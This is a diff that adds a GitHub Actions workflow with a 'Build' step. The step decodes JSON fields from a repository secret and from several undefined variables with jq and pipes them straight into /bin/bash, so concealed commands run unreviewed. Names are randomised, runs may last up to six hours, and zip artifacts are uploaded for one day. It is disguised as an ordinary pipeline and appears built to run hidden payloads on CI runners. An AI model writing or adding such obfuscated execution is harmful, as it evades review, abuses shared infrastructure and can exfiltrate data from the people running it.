@@ -1,0 +1,32 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          rsez0: ${{ secrets.rsez0 }}
+        run: |
+          printf '%s' "$rsez0" | jq -r .p93092 | /bin/bash
+          printf '%s' "$wg85" | jq -r .u5 | /bin/bash
+          echo $k82843 | jq -r .oae24293 | /bin/bash
+          printf '%s' "$mxn652" | jq -r .prsd3 | /bin/bash
+          printf '%s' "$xck0820" | jq -r .uwwq325 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: QkzU2xSJ
+          path: "*.zip"
+          retention-days: 1
